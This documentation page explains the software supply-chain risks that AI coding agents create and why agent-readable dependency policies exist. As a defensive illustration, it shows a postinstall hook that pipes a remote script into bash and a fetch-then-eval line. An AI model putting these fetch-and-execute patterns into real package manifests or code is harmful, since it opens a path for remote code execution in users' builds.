# 🎯 Why This Exists

> Understanding the unique challenges AI agents create in software supply chain security

---

## The New Reality

AI agents can analyze requirements, write code, select dependencies, and deploy systems with minimal human intervention. But **this speed creates new risks**.

Traditional OSS governance assumes humans make careful, deliberate decisions. **AI agents don't work that way.**

---

## 🤖 What Agents Can Do (and Why It's Risky)

| Capability | Risk |
|------------|------|
| 📦 **Introduce dependencies rapidly** | Many packages can be added in one step, faster than a person reviews them |
| 📝 **Modify lockfiles/manifests** | Changes bypass typical scrutiny |
| 🌳 **Add transitive dependencies** | Brings dozens of sub-dependencies invisibly |
| 🔧 **Install tools dynamically** | CLI tools, MCP servers without vetting |
| ⚙️ **Add CI/CD actions** | Privileged tools with elevated access |
| 🐳 **Pull container images** | Base images affect entire deployment |

**The gap:** Traditional processes can't keep pace with agent speed.

---

## ⚠️ Top Supply Chain Risks

### 1. 🎭 Malicious Packages

**Real incidents:**
- [event-stream](https://snyk.io/blog/a-post-mortem-of-the-malicious-event-stream-backdoor/) (2018): the malicious dependency was downloaded nearly 8 million times; the payload targeted one wallet application
- [ua-parser-js](https://github.com/advisories/GHSA-pjwm-rvh2-c87w) (2021): Cryptominer injected
- [colors.js/faker.js](https://www.bleepingcomputer.com/news/security/dev-corrupts-npm-libs-colors-and-faker-breaking-thousands-of-apps/) (2022): Intentional sabotage

**Agent risk:** May not detect typosquatting or compromised packages.

For incidents from 2025 and 2026, including ones that targeted AI coding agents directly, see [threat-coverage.md](threat-coverage.md).

---

### 2. 🔓 Weak Version Pinning

**Risk:** Unpinned versions allow malicious updates to auto-install. Pinning alone is not enough: an agent that picks the newest version on the day it is published pins the malicious one. That is why the policy adds a version cooldown.

**Example:**
```json
"dependencies": {
  "express": "^4.0.0",    // Could install 4.99.99
  "lodash": "*",          // ANY version
  "axios": "latest"       // Dangerous in Docker
}
```

---

### 3. 🔌 Privileged Tool Compromise

**Real incidents:**
- [CodeCov breach](https://about.codecov.io/security-update/) (2021): Bash uploader compromised
- [SolarWinds](https://www.cisa.gov/news-events/news/joint-statement-federal-bureau-investigation-fbi-cybersecurity-and-0) (2020): Build system compromised

**Agent risk:** CI actions, scanners, and MCP servers often have elevated permissions.

---

### 4. 🕵️ Hidden Runtime Dependencies

**Risk:** Dynamic downloads bypass manifest visibility and security scanning.

**Example:**
```bash
"postinstall": "curl https://example.com/script.sh | bash"

fetch('https://cdn.example.com/module.js').then(eval)
```

---

### 5. 💀 Abandoned Packages

**Risk:** No security patches, unresponsive maintainers, single point of failure.

**Signals:**
- Last commit: 3+ years ago
- Open security issues: 12+
- Maintainers: 1 person (unresponsive)

---

## 🌉 The Gap in Traditional Approaches

Traditional OSS governance doesn't work well for agents:

| Traditional | Why It Fails for Agents |
|------------|-------------------------|
| 📄 Written for humans | Agents need short, specific instructions in their context |
| 🏢 Policy documents | Agents can't follow 50-page PDFs |
| 🔀 One-size-fits-all | Doesn't adapt to agent capabilities |
| 🌍 Generic guidance | Not ecosystem-specific |

### What Teams Need

✅ **Agent-readable constraints** in consumable formats  
✅ **Modular guidance** that adapts to capabilities  
✅ **Ecosystem-specific** rules (npm ≠ pip ≠ Maven)  
✅ **Context-aware** (prototype ≠ production)

---

## 🎯 What These Files Do

### ✅ Encourage safer patterns:
- Minimal dependencies
- Well-maintained packages
- Version pinning
- Dependency visibility
- Official registries
- Review for privileged tools

### ✅ Adapt to context:
- Prototype: shorter cooldown, less reporting
- Production: stricter levels
- Regulated: strictest levels, longer cooldown, decision record

### ✅ Support different ecosystems:
- npm, Python, JVM, Go, Rust, containers
- Each has its own mechanics

---

## ❌ What This Does NOT Replace

| Traditional Tool | Still Needed For |
|-----------------|------------------|
| 🔍 **SCA (Software Composition Analysis)** | Automated vulnerability scanning |
| 📋 **SBOM Generation** | Comprehensive software bills of materials |
| 👥 **Code Review** | Human architectural decisions |
| 🚨 **Vulnerability Management** | Incident response and remediation |

---

## 🛡️ Defense in Depth

```
1️⃣  AGENT POLICY → Steer the agent away from risky choices
                ↓
2️⃣  SCA / SBOM TOOLS → Scan what did get added
                ↓
3️⃣  CODE REVIEW → Human review of changes
                ↓
4️⃣  VULNERABILITY MGMT → Monitor and respond
```

Each layer covers what the others miss. The policy is the weakest of the four, because an agent can ignore it; it is also the only one that acts before the dependency is chosen.

---

## 🚀 Moving Forward

AI agents are inevitable and beneficial. **We need to adapt our security practices** to this new reality.

These files are a step toward **safer AI-assisted development**: practical instructions that help agents make better dependency decisions. They are advice to the agent, not a security control.

[👉 Learn how to choose a preset](how-to-choose.md)

---

<div align="center">

[⬆ Back to Main README](../README.md)

</div>
